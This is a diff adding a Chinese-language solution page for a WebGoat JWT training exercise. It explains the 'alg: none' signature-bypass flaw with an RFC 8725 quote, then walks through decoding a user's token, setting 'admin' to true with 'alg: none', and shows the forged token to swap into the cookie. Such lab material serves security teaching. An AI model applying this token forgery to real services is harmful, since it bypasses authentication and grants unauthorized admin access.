@@ -1,0 +1,77 @@
+=== 解答
+
+本练习的核心思路是：操纵令牌可能会导致服务器以不同方式解释令牌。JWT 库最初出现时，会严格按照规范实现，也就是说，库会读取头部指定的算法，并尝试按该算法处理令牌。
+
+[quote, https://tools.ietf.org/html/rfc8725#section-2.1]
+____
+签名后的 JSON Web Token 会在“alg”头部参数中明确指出签名算法，以便支持密码学敏捷性。这一设计与某些库和应用中的缺陷相结合，导致了多种攻击：
+
+* 攻击者可以将算法改为“none”，而某些库会信任此值，并在不检查签名的情况下“验证”JWT。
+
+* 攻击者可以将“RS256”（RSA，2048 位）参数值改为“HS256”（HMAC，SHA-256），而某些库会尝试使用 HMAC-SHA256 验证签名，并将 RSA 公钥用作 HMAC 共享密钥（参见 [McLean] 和 [CVE-2015-9235]）。
+
+缓解措施请参阅第 3.1 和 3.2 节。
+____
+
+基本上，发生的问题是：库只是解析收到的令牌，却没有验证创建令牌时实际使用的密码学操作。
+
+==== 解答
+
+首先注意，我们是以 `Guest` 身份登录的，因此先选择另一位用户，例如 Tom。
+如你所见，Tom 可以投票，但不能重置投票结果。查看请求后会发现，响应会返回一个 `access_token`：
+
+[source]
+----
+GET http://localhost:8080/WebGoat/JWT/votings/login?user=Tom HTTP/1.1
+
+access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MDgxMjg1NjYsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.rTSX6PSXqUoGUvQQDBiqX0re2BSt7s2-X6FPf34Qly9SMpqIUSP8jykedJbjOBNlM3_CTjgk1SvUv48Pz8zIzA
+----
+
+解码后得到：
+
+[source]
+----
+{
+  "alg": "HS512"
+}
+{
+  "iat": 1608128566,
+  "admin": "false",
+  "user": "Tom"
+}
+----
+
+我们可以将 `admin` 声明改为 `false`，但这样会导致签名无效。如何得到有效签名？根据 https://tools.ietf.org/html/rfc7519#section-6.1[RFC 规范]，`alg: none` 是一个有效选项，会产生不安全的 JWT。
+我们来修改令牌：
+
+[source]
+----
+头部：
+
+{
+  "alg": "none"
+}
+
+声明：
+
+{
+  "iat": 1608128566,
+  "admin": "true",
+  "user": "Tom"
+}
+----
+
+如果使用 WebWolf 创建令牌，会得到：
+
+[source]
+----
+eyJhbGciOiJub25lIn0.ew0KICAiYWRtaW4iIDogInRydWUiLA0KICAiaWF0IiA6IDE2MDgxMjg1NjYsDQogICJ1c2VyIiA6ICJUb20iDQp9
+----
+
+现在可以替换 Cookie 中的令牌并再次执行重置操作。注意：末尾需要加上 `.`，否则令牌无效。
+
+== 参考资料
+
+更多信息请参阅以下视频：
+
+video::wt3UixCiPfo[youtube, height=480, width=100%]
